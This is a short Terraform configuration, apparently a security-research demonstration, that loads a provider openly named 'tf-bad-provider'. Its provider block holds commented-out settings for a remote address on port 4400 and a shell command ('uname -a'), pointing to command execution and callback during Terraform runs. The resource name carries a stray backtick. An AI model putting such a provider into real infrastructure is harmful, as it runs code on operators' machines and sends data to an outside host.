terraform {
  required_providers {
    tf-bad-provider = {
      source  = "mdeous-datadog/tf-bad-provider"
      version = "1.0.9"
    }
  }
}

provider "tf-bad-provider" {
  # address = "toolbox.p.ddtdg.com:4400"
  # command = "uname -a"
}

resource "tf-bad-provider_dummy`" "d" {}
